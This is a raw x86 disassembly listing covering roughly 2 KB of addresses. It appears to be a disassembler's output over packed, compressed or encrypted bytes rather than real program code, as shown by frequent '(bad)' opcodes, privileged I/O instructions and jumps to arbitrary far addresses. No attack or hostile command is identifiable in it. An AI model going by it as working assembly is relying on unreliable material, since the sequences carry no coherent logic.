  41630f:	cmp    al,0x2
  416311:	repz (bad) 
  416313:	jg     0x416308
  416315:	inc    ecx
  416316:	int3   
  416317:	outs   dx,DWORD PTR ds:[esi]
  416318:	loope  0x41632b
  41631a:	cmp    eax,0x7f2e80a1
  41631f:	push   eax
  416320:	aaa    
  416321:	test   eax,0x60c01126
  416326:	data16 add BYTE PTR [esi-0x2e],bl
  41632a:	adc    DWORD PTR [edx-0x2f],ecx
  41632d:	cwde   
  41632e:	popa   
  41632f:	leave  
  416330:	xchg   BYTE PTR [esi+eax*4-0x5712cfbb],ah
  416337:	jb     0x416303
  416339:	jp     0x416321
  41633b:	jmp    0x340ac6c8
  416340:	cdq    
  416341:	xchg   esp,eax
  416342:	ret    
  416343:	dec    ecx
  416344:	pop    esi
  416345:	sub    dl,cl
  416347:	xchg   esp,eax
  416348:	das    
  416349:	rol    BYTE PTR [edx],cl
  41634b:	adc    eax,0xee42008d
  416350:	loopne 0x4163af
  416352:	inc    esi
  416353:	imul   DWORD PTR [ecx-0x51228d90]
  416359:	cmp    esi,ebx
  41635b:	add    eax,0x8ed6154a
  416360:	mov    ah,0x55
  416362:	rcl    DWORD PTR [esi-0x542d6bca],cl
  416368:	push   ebp
  416369:	jl     0x4163e7
  41636b:	sbb    bl,BYTE PTR [eax+ebx*2+0x75]
  41636f:	adc    ch,dh
  416371:	(bad)  
  416372:	popa   
  416373:	jno    0x416377
  416375:	(bad)  
  416376:	or     ah,BYTE PTR [eax-0x47]
  416379:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41637a:	in     al,0x97
  41637c:	sbb    al,0x64
  41637e:	sub    al,0x3c
  416380:	sbb    DWORD PTR [ecx],ecx
  416382:	das    
  416383:	ins    DWORD PTR es:[edi],dx
  416384:	xor    ecx,ebp
  416386:	or     edx,DWORD PTR ds:0xbaccb7ef
  41638c:	lock sub dl,ch
  41638f:	sub    esp,ebp
  416391:	je     0x416318
  416393:	je     0x416324
  416395:	inc    edi
  416396:	pop    esi
  416397:	xor    DWORD PTR [esi],esi
  416399:	or     DWORD PTR [eax],edx
  41639b:	rcl    BYTE PTR [ecx+eiz*2],cl
  41639e:	addr16 mov ebp,0xf4c7fc27
  4163a4:	mov    ch,BYTE PTR [esi-0x56e5ac80]
  4163aa:	fadd   QWORD PTR [esi-0x5e964da8]
  4163b0:	adc    ch,ah
  4163b2:	loopne 0x416344
  4163b4:	stos   DWORD PTR es:[edi],eax
  4163b5:	loope  0x4163f2
  4163b7:	mov    cl,0x5d
  4163b9:	ficom  WORD PTR [edx+0x3db50472]
  4163bf:	jae    0x41641d
  4163c1:	push   esi
  4163c2:	dec    ebp
  4163c3:	mov    cl,0xb0
  4163c5:	sar    DWORD PTR [edi-0x76],1
  4163c8:	lods   eax,DWORD PTR ds:[esi]
  4163c9:	pop    si
  4163cb:	push   dx
  4163cd:	xchg   ecx,eax
  4163ce:	add    eax,0xae549220
  4163d3:	jg     0x416409
  4163d5:	mov    al,0x35
  4163d7:	stos   DWORD PTR es:[edi],eax
  4163d8:	call   0xc3836611
  4163dd:	adc    al,0x28
  4163df:	aad    0x20
  4163e1:	(bad)  [eax+0x72]
  4163e4:	enter  0xcd53,0xb6
  4163e8:	rol    BYTE PTR [esi],cl
  4163ea:	outs   dx,DWORD PTR ds:[esi]
  4163eb:	inc    ebp
  4163ec:	adc    edx,DWORD PTR [ecx-0x6a]
  4163ef:	lods   al,BYTE PTR ds:[esi]
  4163f0:	fsubr  QWORD PTR [edi+0x3f]
  4163f3:	sbb    DWORD PTR ds:0x8582d86c,0xffffffe4
  4163fa:	in     eax,dx
  4163fb:	pop    ss
  4163fc:	clc    
  4163fd:	popa   
  4163fe:	adc    eax,0xa642307b
  416403:	sti    
  416404:	addr16 mov ch,0xe7
  416407:	clc    
  416408:	stc    
  416409:	pop    ds
  41640a:	xchg   edx,eax
  41640b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41640c:	mov    ecx,0x58f5dab6
  416411:	mov    ebx,0xd4a64d93
  416416:	inc    ebp
  416417:	shl    BYTE PTR [esi+0x7f],0xac
  41641b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41641c:	dec    esp
  41641d:	popf   
  41641e:	ins    BYTE PTR es:[edi],dx
  41641f:	xlat   BYTE PTR ds:[ebx]
  416420:	pop    ecx
  416421:	xchg   DWORD PTR [esi+0x613bb25],edi
  416427:	lods   al,BYTE PTR ds:[esi]
  416428:	test   al,0x1c
  41642a:	scas   al,BYTE PTR es:[edi]
  41642b:	lds    eax,FWORD PTR [edx+0x472334ae]
  416431:	test   eax,0x6640a86a
  416436:	push   ebx
  416437:	push   0xffffffda
  416439:	push   edx
  41643a:	outs   dx,DWORD PTR fs:[esi]
  41643c:	outs   dx,DWORD PTR ds:[esi]
  41643d:	jmp    0xde2e:0x25761738
  416444:	sub    DWORD PTR [edx+0x29],eax
  416447:	cmp    BYTE PTR [ebp+eiz*8-0x60],ch
  41644b:	loope  0x4164a7
  41644d:	dec    ebp
  41644e:	hlt    
  41644f:	int    0xe3
  416451:	mov    dh,0xad
  416453:	jle    0x416410
  416455:	xor    al,0xf1
  416457:	pop    eax
  416458:	adc    DWORD PTR fs:[edi+0x16035034],eax
  41645f:	add    eax,0x1784761b
  416464:	rol    DWORD PTR ds:0x34df6d5b,0xe8
  41646b:	div    ch
  41646d:	mov    ah,0x4e
  41646f:	mov    ebx,0x49d71e86
  416474:	or     BYTE PTR [ecx-0x68efcf23],0x46
  41647b:	out    0x1,eax
  41647d:	mov    cl,0xb3
  41647f:	int3   
  416480:	out    0x5a,al
  416482:	mov    edx,0xb1454407
  416487:	add    eax,0x7b2c1d94
  41648c:	cmc    
  41648d:	stos   DWORD PTR es:[edi],eax
  41648e:	rol    BYTE PTR [ebp-0x40],0xb1
  416492:	pop    edx
  416493:	xchg   ebp,eax
  416494:	js     0x4164f2
  416496:	dec    ebx
  416497:	cli    
  416498:	ret    
  416499:	jo     0x416483
  41649b:	jp     0x416477
  41649d:	mov    esi,0xd7c022dd
  4164a2:	lods   al,BYTE PTR ds:[esi]
  4164a3:	mov    edx,0x500da881
  4164a8:	fiadd  DWORD PTR [ebx]
  4164aa:	icebp  
  4164ab:	retf   0xebc
  4164ae:	js     0x416463
  4164b0:	mov    BYTE PTR [eax-0x2820992b],0xe5
  4164b7:	jp     0x416527
  4164b9:	out    dx,al
  4164ba:	push   ebp
  4164bb:	push   esp
  4164bc:	retf   0x5e34
  4164bf:	sub    al,0x48
  4164c1:	and    ecx,DWORD PTR [ecx+edx*2+0x2c]
  4164c5:	pop    ds
  4164c6:	sub    BYTE PTR [ebx],al
  4164c8:	int    0x32
  4164ca:	jae    0x4164ab
  4164cc:	dec    ebx
  4164cd:	mov    ch,0x53
  4164cf:	loop   0x416498
  4164d1:	pop    esi
  4164d2:	cmp    DWORD PTR [ebp-0xd0aa017],esp
  4164d8:	jmp    0x4164a2
  4164da:	iret   
  4164db:	jle    0x41654d
  4164dd:	lock xlat BYTE PTR ds:[ebx]
  4164df:	fstp   DWORD PTR [edi-0x11afbc46]
  4164e5:	sub    eax,DWORD PTR [edi-0x381cd9d]
  4164eb:	mov    bl,0x13
  4164ed:	cmp    ebx,DWORD PTR [ebx]
  4164ef:	pop    esp
  4164f0:	push   edx
  4164f1:	arpl   WORD PTR [esi+0x49],di
  4164f4:	mov    dh,0xf
  4164f6:	and    dh,dh
  4164f8:	les    edx,FWORD PTR [eax+0x5]
  4164fb:	jecxz  0x41649f
  4164fd:	int3   
  4164fe:	loope  0x4164df
  416500:	(bad)  
  416501:	imul   edi,DWORD PTR [edi+0x56546b2f],0x65b4dc2f
  41650b:	cmp    edx,esp
  41650d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41650e:	ins    DWORD PTR es:[edi],dx
  41650f:	jns    0x416512
  416511:	mov    esi,0x3b65cc8c
  416516:	sub    ebx,DWORD PTR [ebp+0x3a771c4c]
  41651c:	pop    eax
  41651d:	shl    DWORD PTR [esi],0xd1
  416520:	fcmove st,st(5)
  416522:	ss jns 0x41651a
  416525:	clc    
  416526:	ds xor ebp,edx
  416529:	push   cs
  41652a:	mov    dh,al
  41652c:	(bad)  
  41652d:	sub    al,0xdf
  41652f:	shr    dl,0xf8
  416532:	ret    0x6c72
  416535:	jle    0x41651e
  416537:	adc    DWORD PTR [edx-0x2],esp
  41653a:	pcmpeqd mm5,QWORD PTR [ebx+0x362e555d]
  416541:	or     bh,BYTE PTR [edx+ecx*4+0x7307dcc]
  416548:	in     al,dx
  416549:	sbb    DWORD PTR ds:0xfc654f0f,0xffffffc4
  416550:	inc    edi
  416551:	adc    DWORD PTR [edx+0x3f71a5d7],ebp
  416557:	inc    edi
  416558:	ins    BYTE PTR es:[edi],dx
  416559:	dec    edx
  41655a:	xchg   BYTE PTR [ecx-0x4c23e0dd],ah
  416560:	pushf  
  416561:	ror    cl,cl
  416563:	inc    BYTE PTR [ebx+0x46db4126]
  416569:	mov    dh,BYTE PTR [esp+edx*1+0x15]
  41656d:	cwde   
  41656e:	push   esi
  41656f:	push   ss
  416570:	ret    
  416571:	mov    bh,0x9e
  416573:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416574:	and    eax,0x1ee83193
  416579:	(bad)  
  41657a:	cmp    eax,0x4b7dde70
  41657f:	jle    0x416586
  416581:	std    
  416582:	test   DWORD PTR [ebx],ebx
  416584:	gs or  al,0x77
  416587:	fld    QWORD PTR [edx+eax*1+0x1a931adb]
  41658e:	not    BYTE PTR [ebp+0x9]
  416591:	push   0x7c89a04
  416596:	ss jmp 0x4165eb
  416599:	test   al,0x11
  41659b:	aad    0x9c
  41659d:	mov    dh,BYTE PTR [ecx-0x2d]
  4165a0:	dec    esi
  4165a1:	js     0x4165c8
  4165a3:	not    al
  4165a5:	in     eax,0x0
  4165a7:	test   eax,0xac89a461
  4165ac:	cwde   
  4165ad:	shl    BYTE PTR [edx],1
  4165af:	popf   
  4165b0:	clc    
  4165b1:	jp     0x416586
  4165b3:	mov    esp,0xd87d4f10
  4165b8:	mul    BYTE PTR [edx+0x25]
  4165bb:	lea    esp,[eax-0x6c]
  4165be:	test   al,0xd
  4165c0:	xchg   DWORD PTR [esp+esi*2],edi
  4165c3:	xor    dl,BYTE PTR [eax+edi*1]
  4165c6:	jmp    0x4165a0
  4165c8:	repnz dec ecx
  4165ca:	xchg   esi,eax
  4165cb:	pop    esi
  4165cc:	or     DWORD PTR [ebx],ebx
  4165ce:	daa    
  4165cf:	push   0x57
  4165d1:	cmp    BYTE PTR [edx],0x59
  4165d4:	imul   edx,edx,0x1009064d
  4165da:	mov    edi,0xc2b8a777
  4165df:	mov    ch,0x8b
  4165e1:	enter  0xea33,0xdb
  4165e5:	stos   DWORD PTR es:[edi],eax
  4165e6:	popa   
  4165e7:	jle    0x416638
  4165e9:	pop    ebx
  4165ea:	fwait
  4165eb:	mov    ch,0xea
  4165ed:	cmp    eax,0x30c50a3c
  4165f2:	cmp    DWORD PTR [eax-0x2b],edi
  4165f5:	mov    edi,0x49b7e606
  4165fa:	pop    eax
  4165fb:	push   es
  4165fc:	push   ss
  4165fd:	jl     0x4165e7
  4165ff:	gs out dx,eax
  416601:	sub    bh,BYTE PTR [ebp-0x47]
  416604:	push   es
  416605:	js     0x416591
  416607:	test   al,0x36
  416609:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41660a:	xchg   ebx,eax
  41660b:	dec    ecx
  41660c:	xchg   ecx,eax
  41660d:	jle    0x416594
  41660f:	jmp    0x41668a
  416611:	mov    eax,ds:0x332cdcda
  416616:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416617:	and    BYTE PTR [esi-0x4c],0xae
  41661b:	pushf  
  41661c:	jg     0x4165f0
  41661e:	inc    esp
  41661f:	or     bh,BYTE PTR [esi]
  416621:	adc    al,0xd6
  416623:	xchg   edi,eax
  416624:	xchg   edx,eax
  416625:	cmp    BYTE PTR [edx+0x10],cl
  416628:	call   0x5a91:0xab4091f9
  41662f:	aas    
  416630:	jg     0x416608
  416632:	imul   esi,DWORD PTR [eax+ebp*8+0x6f],0xaa8420d1
  41663a:	jmp    0x9d31:0xad66fdc4
  416641:	push   ss
  416642:	aaa    
  416643:	in     al,0xb2
  416645:	mov    ch,0xea
  416647:	pop    ss
  416648:	pusha  
  416649:	pop    ss
  41664a:	dec    edx
  41664b:	adc    DWORD PTR [ebx-0x78],ebx
  41664e:	lods   al,BYTE PTR ds:[esi]
  41664f:	jge    0x416626
  416651:	(bad)  
  416652:	ins    DWORD PTR es:[edi],dx
  416653:	mov    edx,0xb33b54eb
  416658:	je     0x4165de
  41665a:	jnp    0x4165fe
  41665c:	inc    eax
  41665d:	cli    
  41665e:	fwait
  41665f:	outs   dx,DWORD PTR ds:[esi]
  416660:	push   ds
  416661:	out    0xb6,eax
  416663:	inc    edx
  416664:	push   0xcde31797
  416669:	or     al,0x37
  41666b:	cmp    eax,0xbff063df
  416670:	sub    al,0x87
  416672:	enter  0x2bcd,0xcf
  416676:	mov    al,ds:0xfe6b9eb8
  41667b:	mov    edx,0xc4e381b4
  416680:	ins    DWORD PTR es:[edi],dx
  416681:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416682:	jno    0x416695
  416684:	xor    DWORD PTR [esi],ebx
  416686:	xor    BYTE PTR [eax],bl
  416688:	jb     0x41668e
  41668a:	loope  0x4166e0
  41668c:	sbb    DWORD PTR [esi+0x42],edi
  41668f:	cli    
  416690:	sti    
  416691:	jno    0x4166b7
  416693:	repnz mov ecx,0xa4379e4f
  416699:	inc    esp
  41669a:	push   0xffffffd9
  41669c:	aas    
  41669d:	adc    dl,BYTE PTR [edi+0x21584a2e]
  4166a3:	outs   dx,BYTE PTR ds:[esi]
  4166a4:	xchg   edx,eax
  4166a5:	(bad)  [edi+esi*8+0x7ebcd55b]
  4166ac:	xor    dh,ah
  4166ae:	sti    
  4166af:	mov    bl,BYTE PTR [edi-0x44bcc26]
  4166b5:	les    ebx,FWORD PTR [ebx+0x2660fa3]
  4166bb:	jp     0x416731
  4166bd:	rcl    DWORD PTR [esi+0x1ce12ab5],cl
  4166c3:	push   edx
  4166c4:	or     al,0xd3
  4166c6:	add    al,cl
  4166c8:	adc    BYTE PTR [esi-0x3c],ch
  4166cb:	adc    eax,DWORD PTR [edi]
  4166cd:	in     eax,0x1b
  4166cf:	scas   eax,DWORD PTR es:[edi]
  4166d0:	das    
  4166d1:	fs sti 
  4166d3:	mov    edi,0xcf54463a
  4166d9:	xchg   ebx,eax
  4166da:	scas   al,BYTE PTR es:[edi]
  4166db:	scas   eax,DWORD PTR es:[edi]
  4166dc:	lds    ebp,FWORD PTR [eax+ecx*2]
  4166df:	in     eax,dx
  4166e0:	or     eax,0xf29d432a
  4166e5:	push   edx
  4166e6:	jns    0x4166c6
  4166e8:	scas   al,BYTE PTR es:[edi]
  4166e9:	push   ebx
  4166ea:	jecxz  0x41669c
  4166ec:	dec    esi
  4166ed:	and    eax,DWORD PTR [edi+0x5]
  4166f0:	adc    DWORD PTR [ebp-0x5d],esi
  4166f3:	mov    fs,edi
  4166f5:	popf   
  4166f6:	pop    ecx
  4166f7:	push   esp
  4166f8:	cmp    BYTE PTR [ebp+ebp*1+0x60706dc7],ch
  4166ff:	popf   
  416700:	(bad)  
  416701:	das    
  416702:	popf   
  416703:	or     dl,0xb7
  416706:	call   0xf141:0x6b062fb3
  41670d:	xor    ebp,0x13
  416710:	je     0x4166eb
  416712:	je     0x416754
  416714:	mov    al,ds:0x28ef9d56
  416719:	mov    al,0x56
  41671b:	or     al,0x5c
  41671d:	jno    0x4166f0
  41671f:	and    eax,ebx
  416721:	fs dec esp
  416723:	mov    bl,0x76
  416725:	popa   
  416726:	rol    BYTE PTR [esi],1
  416728:	mov    ds:0x969606cb,eax
  41672d:	call   FWORD PTR [ebx]
  41672f:	push   0xffffffbb
  416731:	repnz inc edi
  416733:	xor    BYTE PTR [ebp+eax*4+0x37],bl
  416737:	sbb    eax,0x3436b650
  41673c:	sti    
  41673d:	mov    ds:0x1d6fdf31,al
  416742:	pop    ebp
  416743:	push   ebp
  416744:	or     edi,DWORD PTR [ecx+ecx*1-0x5ca41b7c]
  41674b:	int    0x3f
  41674d:	or     dh,BYTE PTR [eax]
  41674f:	adc    al,BYTE PTR [eax-0x78]
  416752:	jmp    0xc0bb1ea4
  416757:	mov    al,ds:0x767c4419
  41675c:	loop   0x416746
  41675e:	std    
  41675f:	pop    eax
  416760:	outs   dx,DWORD PTR ds:[esi]
  416761:	inc    edx
  416762:	and    esi,DWORD PTR [edi+ebx*2-0x18]
  416766:	or     BYTE PTR [ebx-0x1cecfa56],al
  41676c:	arpl   dx,si
  41676e:	mov    esp,0xd2cb4756
  416773:	fmul   st,st(5)
  416775:	fwait
  416776:	or     BYTE PTR [ecx+0x74],cl
  416779:	pop    ecx
  41677a:	outs   dx,DWORD PTR ds:[esi]
  41677b:	fldcw  WORD PTR [ebx]
  41677d:	imul   ecx,ebx,0x22
  416780:	push   ebx
  416781:	xchg   DWORD PTR [ebx+0x46],edi
  416784:	aam    0x83
  416786:	int3   
  416787:	mov    ecx,0x1647dd85
  41678c:	xchg   esi,eax
  41678d:	ret    0x19f9
  416790:	sti    
  416791:	fwait
  416792:	test   eax,0xfa92846e
  416797:	aaa    
  416798:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416799:	jae    0x41674b
  41679b:	and    eax,0x3b122a68
  4167a0:	adc    ebp,DWORD PTR [edi+ecx*2+0x54d222a9]
  4167a7:	int3   
  4167a8:	jecxz  0x41675e
  4167aa:	xor    eax,DWORD PTR [edx-0xcc4daa2]
  4167b0:	jmp    0x839adc9f
  4167b5:	test   al,0x64
  4167b7:	pop    ecx
  4167b8:	xor    ecx,DWORD PTR [eax+0x47]
  4167bb:	sbb    ebx,edi
  4167bd:	dec    esi
  4167be:	dec    ecx
  4167bf:	inc    ecx
  4167c0:	pop    ebp
  4167c1:	(bad)  
  4167c2:	push   0x1a497628
  4167c7:	out    dx,eax
  4167c8:	jg     0x4167e5
  4167ca:	jne    0x4167d7
  4167cc:	test   eax,0x73a584e9
  4167d1:	call   0x3db59020
  4167d6:	jne    0x416836
  4167d8:	mov    ?,ebx
  4167da:	in     al,0x84
  4167dc:	mov    edi,DWORD PTR [edi+edi*2-0x1f]
  4167e0:	and    al,0x63
  4167e2:	lea    esp,[edi-0x59]
  4167e5:	mov    ds:0x831d286b,al
  4167ea:	std    
  4167eb:	push   ebx
  4167ec:	sbb    ebx,DWORD PTR [ebx]
  4167ee:	mov    al,0x58
  4167f0:	push   0x4a
  4167f2:	adc    eax,0xe1fa8d62
  4167f7:	inc    eax
  4167f8:	je     0x4167bb
  4167fa:	pop    ss
  4167fb:	and    ah,dh
  4167fd:	pushf  
  4167fe:	mov    cs,WORD PTR [esi+0x7b0c2d12]
  416804:	jo     0x41686f
  416806:	pop    esi
  416807:	stos   BYTE PTR es:[edi],al
  416808:	hlt    
  416809:	test   al,0x8d
  41680b:	mov    ds:0xcb993eeb,eax
  416810:	or     ah,BYTE PTR [ebx-0x2d]
  416813:	and    dh,bh
  416815:	adc    dl,dh
  416817:	test   al,0x4a
  416819:	sub    DWORD PTR [ebp+esi*4+0x5f],edx
  41681d:	outs   dx,DWORD PTR ds:[esi]
  41681e:	cmp    BYTE PTR [edi-0x55],dl
  416821:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416822:	cmp    cl,bh
  416824:	cmc    
  416825:	sub    eax,0x83523ff9
  41682a:	jecxz  0x41684e
  41682c:	pop    ds
  41682d:	add    eax,0x46f862c0
  416832:	aad    0xd9
  416834:	shr    DWORD PTR [ebx],1
  416836:	push   edi
  416837:	add    dl,BYTE PTR [eax-0x41dff459]
  41683d:	arpl   WORD PTR [edi],bp
  41683f:	bound  ebx,QWORD PTR [edx]
  416841:	in     eax,dx
  416842:	out    0x2e,al
  416844:	push   ebp
  416845:	mov    edi,esi
  416847:	and    BYTE PTR [ebx+0x6c],cl
  41684a:	mov    ah,0x4d
  41684c:	in     al,0x82
  41684e:	mov    ch,0x59
  416850:	jg     0x4168a4
  416852:	inc    esi
  416853:	mov    ah,0x1c
  416855:	pusha  
  416856:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416857:	loopne 0x4168a4
  416859:	popa   
  41685a:	jb     0x4167e5
  41685c:	jp     0x416855
  41685e:	mov    cl,0xb3
  416860:	and    al,0x7c
  416862:	or     eax,0xf5b8743b
  416867:	test   DWORD PTR [esi-0x6501cd98],esi
  41686d:	(bad)  
  41686e:	mov    eax,0xf4acbee9
  416873:	(bad)  
  416874:	cmp    DWORD PTR [edx-0x15],ebp
  416877:	(bad)  
  416878:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416879:	out    0xd2,al
  41687b:	xchg   ecx,eax
  41687c:	stos   BYTE PTR es:[edi],al
  41687d:	push   edi
  41687e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41687f:	fneni(8087 only) 
  416881:	inc    edx
  416882:	pusha  
  416883:	ds xchg esp,eax
  416885:	jb     0x41683c
  416887:	push   0x707b9950
  41688c:	test   edi,edx
  41688e:	xchg   ecx,eax
  41688f:	iret   
  416890:	lods   al,BYTE PTR ds:[esi]
  416891:	pop    ecx
  416892:	pop    ds
  416893:	or     DWORD PTR [esi-0x5d7f1bb2],eax
  416899:	mov    ds,edx
  41689b:	adc    DWORD PTR [eax-0x62],0x1ff0e083
  4168a2:	mul    BYTE PTR ss:[bp-0x27]
  4168a7:	and    al,0x1
  4168a9:	sbb    eax,0xf3aa85cf
  4168ae:	arpl   WORD PTR [eax+eax*8],si
  4168b1:	or     ah,0x20
  4168b4:	mov    ch,0x43
  4168b6:	cwde   
  4168b7:	cdq    
  4168b8:	xlat   BYTE PTR ds:[ebx]
  4168b9:	into   
  4168ba:	int    0x1
  4168bc:	dec    ebx
  4168bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168be:	es (bad) 
  4168c0:	loop   0x416919
  4168c2:	rcl    BYTE PTR [esi],0x6b
  4168c5:	retf   0x3b86
  4168c8:	inc    eax
  4168c9:	adc    eax,0x2c84cf8d
  4168ce:	icebp  
  4168cf:	pop    eax
  4168d0:	pusha  
  4168d1:	bound  eax,QWORD PTR [ebx+0x158b8433]
  4168d7:	repz jg 0x4168f6
  4168da:	dec    edi
  4168db:	dec    ebp
  4168dc:	xchg   ecx,eax
  4168dd:	inc    esi
  4168de:	xchg   ebp,eax
  4168df:	push   esi
  4168e0:	fst    QWORD PTR [esi+edx*8-0x3e53fad2]
  4168e7:	in     al,0xe5
  4168e9:	xchg   esi,eax
  4168ea:	ror    cl,cl
  4168ec:	je     0x4168c7
  4168ee:	jo     0x4168ce
  4168f0:	les    ebp,FWORD PTR [edx+0x12]
  4168f3:	or     al,0x17
  4168f5:	(bad)  
  4168f6:	retf   0xeabe
  4168f9:	retf   
  4168fa:	fcmovb st,st(0)
  4168fc:	std    
  4168fd:	call   0x8821003a
  416902:	dec    edx
  416903:	and    edi,edx
  416905:	jle    0x41692c
  416907:	xor    DWORD PTR [ecx],esi
  416909:	inc    esi
  41690a:	lods   al,BYTE PTR ds:[esi]
  41690b:	mov    esp,0xa99874d7
  416910:	xchg   edi,eax
  416911:	imul   eax,DWORD PTR [ebp-0x267a1475],0xffffffd4
  416918:	jp     0x41695e
  41691a:	sbb    DWORD PTR [edi-0x66],edx
  41691d:	xchg   ebp,eax
  41691e:	imul   edi,esi,0x71ab7034
  416924:	stc    
  416925:	pop    ecx
  416926:	(bad)  
  416927:	cs jecxz 0x4169a7
  41692a:	mov    dh,0xfa
  41692c:	aad    0xff
  41692e:	cmp    DWORD PTR [ebp+0x3e353b24],ebx
  416934:	jle    0x416950
  416936:	sub    BYTE PTR [ebx-0x1],bl
  416939:	sbb    BYTE PTR [edx],0xd8
  41693c:	pop    ebx
  41693d:	jnp    0x416919
  41693f:	jge    0x416900
  416941:	or     ebx,eax
  416943:	mov    al,ds:0x4e862d8e
  416948:	xor    ecx,DWORD PTR [edx+0x68]
  41694b:	imul   eax,DWORD PTR [edx],0x8
  41694e:	jg     0x416968
  416950:	scas   eax,DWORD PTR es:[edi]
  416951:	pushf  
  416952:	inc    ebp
  416953:	(bad)  
  416954:	fstp   st(6)
  416956:	sbb    BYTE PTR [edx],cl
  416958:	adc    dl,BYTE PTR [ebx]
  41695a:	jnp    0x41691f
  41695c:	and    edx,DWORD PTR [ebp-0x9e7aa16]
  416962:	call   0xd772914a
  416967:	push   0xb84fb29a
  41696c:	cld    
  41696d:	cld    
  41696e:	mov    ?,WORD PTR [eax+0x11f10347]
  416974:	jns    0x416968
  416976:	sti    
  416977:	fsub   QWORD PTR [eax+0x3e13e58a]
  41697d:	fcomp  QWORD PTR [edx-0x76ddf558]
  416983:	push   esp
  416984:	dec    esi
  416985:	pop    edx
  416986:	sbb    edx,DWORD PTR [edi]
  416988:	iret   
  416989:	imul   edx,DWORD PTR [ebp-0x2b7ae505],0xf197cc4c
  416993:	jbe    0x416939
  416995:	cld    
  416996:	jnp    0x416975
  416998:	sahf   
  416999:	dec    esi
  41699a:	pusha  
  41699b:	ror    BYTE PTR [ebp-0x12],0xa8
  41699f:	xor    BYTE PTR [ecx-0x4454967e],cl
  4169a5:	sub    esp,DWORD PTR [esp+eax*2-0x63f0a4f4]
  4169ac:	push   ds
  4169ad:	ret    
  4169ae:	mov    eax,ds:0x488b4edb
  4169b3:	mov    ?,WORD PTR [eax+edx*4-0x58]
  4169b7:	dec    edi
  4169b8:	sub    BYTE PTR [ebp+0x71],0x90
  4169bc:	cs in  eax,dx
  4169be:	inc    ebx
  4169bf:	xchg   bh,bh
  4169c1:	retf   0x263b
  4169c4:	adc    DWORD PTR [ebp-0x4d9443d1],ecx
  4169ca:	adc    edi,DWORD PTR [ecx-0x39]
  4169cd:	scas   al,BYTE PTR es:[edi]
  4169ce:	(bad)  
  4169cf:	sahf   
  4169d0:	mov    ch,0x2f
  4169d2:	and    cl,ah
  4169d4:	lea    ebx,gs:[eax+0x26]
  4169d8:	inc    eax
  4169d9:	mov    BYTE PTR [eax+0x2a],bl
  4169dc:	test   DWORD PTR [ebp-0x17],ecx
  4169df:	mov    al,0xaf
  4169e1:	xchg   edx,eax
  4169e2:	mov    esp,DWORD PTR [eax+eax*8]
  4169e5:	(bad)  
  4169e6:	cmp    ch,BYTE PTR [edi-0x6fc47863]
  4169ec:	push   es
  4169ed:	sahf   
  4169ee:	push   ss
  4169ef:	test   DWORD PTR [edi],0xbc7e6e9c
  4169f5:	fist   DWORD PTR [edx]
  4169f7:	adc    BYTE PTR [ecx+0x4b6cd826],0x6d
  4169fe:	dec    ebx
  4169ff:	push   cs
  416a00:	dec    ebx
  416a01:	scas   eax,DWORD PTR es:[edi]
  416a02:	inc    esi
  416a03:	mov    ch,0x24
  416a05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a06:	adc    bh,BYTE PTR [eax]
  416a08:	lods   eax,DWORD PTR ds:[esi]
  416a09:	and    cl,BYTE PTR [edi+0x62]
  416a0c:	stos   BYTE PTR es:[edi],al
  416a0d:	ror    DWORD PTR [edx-0x57],cl
  416a10:	and    edx,DWORD PTR [edi+0x26265ed6]
  416a16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a17:	jbe    0x416a4a
  416a19:	loope  0x416a5d
  416a1b:	jmp    0x4169eb
  416a1d:	inc    esp
  416a1e:	fwait
  416a1f:	sbb    bh,cl
  416a21:	push   0x1e5e09b1
  416a26:	retf   0xe8e9
  416a29:	inc    esp
  416a2a:	je     0x4169be
  416a2c:	sar    BYTE PTR [eax-0x6655b0e5],1
  416a32:	cmp    ch,bl
  416a34:	je     0x416a97
  416a36:	fsubp  st(7),st
  416a38:	mov    DWORD PTR [esi+esi*2+0x69],0x6facb3de
  416a40:	mov    edi,0xb53d1364
  416a45:	sbb    DWORD PTR [eax],esi
  416a47:	fdivr  DWORD PTR [esi-0x6933f75]
  416a4d:	fcomp  QWORD PTR [ecx+0x666fb1ae]
  416a53:	leave  
  416a54:	sbb    al,0x84
  416a56:	test   DWORD PTR [esi],ebp
  416a58:	icebp  
  416a59:	sub    al,0xe
  416a5b:	jmp    0x4836b852
  416a60:	mov    BYTE PTR [ecx+0x25],dh
  416a63:	lea    edi,[esi-0x40]
  416a66:	and    al,0xd9
  416a68:	push   ds
  416a69:	repz dec edi
  416a6b:	mov    ch,0x2b
  416a6d:	repz or ebp,DWORD PTR [edx-0x74]
  416a71:	sar    BYTE PTR [ebx+edx*1],cl
  416a74:	inc    edx
  416a76:	mov    ah,0x1f
  416a78:	xor    DWORD PTR [ebx-0x6c76b960],ecx
  416a7e:	dec    eax
  416a7f:	cmp    BYTE PTR [ecx-0x6ca9e7ee],bl
  416a85:	popa   
  416a86:	inc    eax
  416a87:	push   0x1f6c3e11
  416a8c:	mov    ss:0x2b3eb211,eax
  416a92:	shl    DWORD PTR [edx-0x165273b9],1
  416a98:	jmp    0x5cfcf2c1
  416a9d:	cdq    
  416a9e:	lahf   
  416a9f:	das    
  416aa0:	adc    eax,0x3b6e2561
  416aa5:	sub    BYTE PTR [edi+0x32d74799],cl
  416aab:	push   edx
  416aac:	sub    ecx,DWORD PTR [eax-0x16]
  416aaf:	jge    0x416b1b
  416ab1:	loop   0x416afb
  416ab3:	enter  0x9afe,0xd2
  416ab7:	push   ebx
  416ab8:	lea    ebp,[ecx-0x80]
  416abb:	in     al,0x62
  416abd:	jo     0x416b35
  416abf:	sub    DWORD PTR [esi-0x53],0xabb8ed73
